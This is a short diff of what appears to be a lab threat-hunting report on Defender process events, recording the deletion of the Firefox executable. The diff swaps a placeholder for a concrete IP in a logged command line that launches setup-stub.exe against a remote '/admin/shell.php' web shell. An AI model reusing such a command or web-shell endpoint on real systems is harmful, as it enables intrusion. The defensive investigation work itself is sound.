@@ -193,7 +193,7 @@ DeviceProcessEvents
 - **Event:**: `FileDeleted - firefox.exe`
 - **Location:**  `C:\Program Files\Mozilla Firefox\firefox.exe`
 **Critical:** Legitimate Firefox executable deleted
-**Initiating Process:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://[YOUR-LAB-IP]/admin/shell.php`
+**Initiating Process:** `setup-stub.exe -no-remote -profile "C:\Users\employee®@\Downloads\Temp\MalProfile" http://172.203.80.23/admin/shell.php`
 - Direct evidence of malicious activity
 
 - **Timestamp:** `2025-10-12T05:55:31.4027468Z`
